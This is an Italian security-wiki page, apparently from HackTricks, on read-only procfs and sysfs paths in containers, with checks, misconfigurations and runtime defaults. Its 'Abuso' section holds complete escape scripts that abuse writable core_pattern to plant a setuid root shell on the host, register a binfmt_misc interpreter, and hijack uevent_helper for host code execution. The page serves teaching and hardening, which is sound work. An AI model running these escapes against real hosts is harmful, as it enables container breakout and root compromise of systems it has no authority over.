# Percorsi di sistema in sola lettura

{{#include ../../../../banners/hacktricks-training.md}}

I percorsi di sistema in sola lettura sono una protezione distinta rispetto ai percorsi mascherati. Invece di nascondere completamente un percorso, il runtime lo espone ma lo monta in sola lettura. Questo è comune per alcune posizioni di procfs e sysfs dove l'accesso in lettura può essere accettabile o necessario per il funzionamento, mentre le scritture sarebbero troppo pericolose.

Lo scopo è semplice: molte interfacce del kernel diventano molto più pericolose quando sono scrivibili. Un mount in sola lettura non elimina tutto il valore di reconnaissance, ma impedisce a un workload compromesso di modificare i file esposti al kernel tramite quel percorso.

## Funzionamento

I runtime spesso contrassegnano parti della vista proc/sys come in sola lettura. A seconda del runtime e dell'host, questo può includere percorsi come:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

La lista effettiva varia, ma il modello è lo stesso: consentire la visibilità dove necessario, negare la mutazione per impostazione predefinita.

## Lab

Ispeziona l'elenco dei percorsi in sola lettura dichiarati da Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Ispeziona la vista montata di proc/sys dall'interno del container:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Impatto sulla sicurezza

I percorsi di sistema montati in sola lettura riducono una vasta classe di abusi con impatto sull'host. Anche se un attaccante può ispezionare procfs o sysfs, l'impossibilità di scrivere lì rimuove molte vie di modifica diretta che coinvolgono parametri del kernel, crash handler, helper per il caricamento dei moduli o altre interfacce di controllo. L'esposizione non scompare, ma la transizione da divulgazione di informazioni a influenza sull'host diventa più difficile.

## Configurazioni errate

I principali errori sono rimuovere la maschera o rimontare percorsi sensibili in modalità read-write, esporre direttamente il contenuto di proc/sys dell'host con bind mounts scrivibili, o usare modalità privileged che aggirano di fatto i default di runtime più sicuri. In Kubernetes, `procMount: Unmasked` e i workload privilegiati spesso si presentano insieme a una protezione di proc più debole. Un altro errore operativo comune è presumere che, dato che il runtime di solito monta questi percorsi in sola lettura, tutti i workload stiano ancora ereditando quel comportamento di default.

## Abuso

Se la protezione è debole, comincia cercando voci scrivibili in proc/sys:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Quando sono presenti voci scrivibili, i percorsi di follow-up ad alto valore includono:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
What these commands can reveal:

- Writable entries under `/proc/sys` often mean the container can modify host kernel behavior rather than merely inspect it.
- `core_pattern` is especially important because a writable host-facing value can be turned into a host code-execution path by crashing a process after setting a pipe handler.
- `modprobe` reveals the helper used by the kernel for module-loading related flows; it is a classic high-value target when writable.
- `binfmt_misc` tells you whether custom interpreter registration is possible. If registration is writable, this can become an execution primitive instead of just an information leak.
- `panic_on_oom` controls a host-wide kernel decision and can therefore turn resource exhaustion into host denial of service.
- `uevent_helper` is one of the clearest examples of a writable sysfs helper path producing host-context execution.

Interesting findings include writable host-facing proc knobs or sysfs entries that should normally have been read-only. At that point, the workload has moved from a constrained container view toward meaningful kernel influence.

### Esempio completo: `core_pattern` Host Escape

Se `/proc/sys/kernel/core_pattern` è scrivibile dall'interno del container e punta alla vista del kernel dell'host, può essere abusato per eseguire un payload dopo un crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Se il percorso raggiunge realmente il kernel dell'host, il payload viene eseguito sull'host e lascia dietro di sé una setuid shell.

### Esempio completo: Registrazione di `binfmt_misc`

Se `/proc/sys/fs/binfmt_misc/register` è scrivibile, una registrazione di un interprete personalizzato può produrre code execution quando il file corrispondente viene eseguito:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Su un `binfmt_misc` scrivibile rivolto all'host, il risultato è l'esecuzione di codice nel percorso dell'interprete attivato dal kernel.

### Esempio completo: `uevent_helper`

Se `/sys/kernel/uevent_helper` è scrivibile, il kernel può invocare un helper sul percorso dell'host quando viene attivato un evento corrispondente:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
La ragione per cui questo è così pericoloso è che il percorso dell'helper viene risolto dalla prospettiva del filesystem dell'host anziché da un contesto sicuro limitato al container.

## Controlli

Questi controlli determinano se l'esposizione di procfs/sysfs è in sola lettura dove previsto e se il workload può ancora modificare interfacce sensibili del kernel.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Cosa è interessante qui:

- Un workload hardened normale dovrebbe esporre pochissime voci proc/sys scrivibili.
- I percorsi `/proc/sys` scrivibili sono spesso più importanti rispetto al semplice accesso in lettura.
- Se il runtime indica che un percorso è read-only ma nella pratica è scrivibile, esaminare attentamente mount propagation, bind mounts e le impostazioni di privilegio.

## Impostazioni predefinite del runtime

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Abilitato per impostazione predefinita | Docker definisce una lista predefinita di percorsi read-only per le voci sensibili di proc | esposizione dei mount host proc/sys, `--privileged` |
| Podman | Abilitato per impostazione predefinita | Podman applica percorsi read-only predefiniti a meno che non siano esplicitamente allentati | `--security-opt unmask=ALL`, ampi mount verso l'host, `--privileged` |
| Kubernetes | Eredita i default del runtime | Usa il modello di percorsi read-only del runtime sottostante a meno che non sia indebolito dalle impostazioni del Pod o da mount host | `procMount: Unmasked`, workload privilegiati, mount host proc/sys scrivibili |
| containerd / CRI-O under Kubernetes | Default del runtime | Solitamente si basa sui default OCI/runtime | come nella riga Kubernetes; modifiche dirette alla configurazione del runtime possono indebolire il comportamento |

Il punto chiave è che i percorsi di sistema in read-only sono solitamente presenti come default del runtime, ma sono facili da compromettere con modalità privileged o bind mounts host.
{{#include ../../../../banners/hacktricks-training.md}}
